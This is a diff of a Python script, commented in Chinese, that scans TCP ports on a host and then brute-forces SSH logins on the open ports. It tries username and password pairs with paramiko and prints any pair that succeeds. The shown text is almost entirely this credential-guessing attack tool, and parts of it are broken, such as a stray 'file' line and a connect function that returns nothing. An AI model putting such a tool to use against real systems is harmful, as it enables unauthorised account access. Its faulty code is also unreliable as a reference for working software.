@@ -1,11 +1,11 @@
-import socket
 from socket import * 
 import sys, time
 from datetime import datetime
 import os, io
+import paramiko
 
 host = '127.0.0.1'
-max_port = 500
+max_port = 1300
 min_port = 1
 opened_port = []
 
@@ -42,6 +42,7 @@ for port in range(min_port, max_port):
 
         if response == 0:
             print("[*] Port %d: Open" % port)
+            opened_port.append(port)
     except Exception as e:
         pass
 
@@ -50,8 +51,10 @@ totalTimeDuration = stop_time - start_time
 print("\n[*] Scanning Finished At %s ..." % (time.strftime("%H:%M:%S")))
 print("[*] Scanning Duration: %s ..." % totalTimeDuration)
 print("[*] 掃瞄完畢 !")
+time.sleep(2)
 
 #` ---------- 第一階段完成 ----------
+import socket
 
 line = "\n-------------------------------------------------------\n"
 print(line)
@@ -68,18 +71,21 @@ try:
         sys.exit(4)
 except KeyboardInterrupt:
     print("\n\n[*] 取消動作！")
-    sys.exit(3)
+    sys.exit(2)
 
 def ssh_connect(userName, passWord, code = 0):
     ssh = paramiko.SSHClient()
     ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
     try:
+        # 期望
+        for portList in opened_port:
+            ssh.connect(host, username = userName, password = passWord, port = portList)
         pass
     except paramiko.AuthenticationException:
-        #[*] Authentication FAiled ...
+        #[*] Authentication FAiled ... （猜測失敗）
         code = 1
     except socket.error as se:
-        #[*] Connection Failed ... Host Down
+        #[*] Connection Failed ... Host Down (找不到主機)
         code = 2
     file
     ssh.close()  
@@ -97,6 +103,7 @@ try:
                 for _password in P:
                     _user = _user.strip('\n')
                     _password = _password.strip('\n')
+                    response = ssh_connect(_user, _password)
                     if response == 0:
                         print("%s[*] User: %s [*] Password: %s%s" % (line, _user, _password, line))
                         # continue
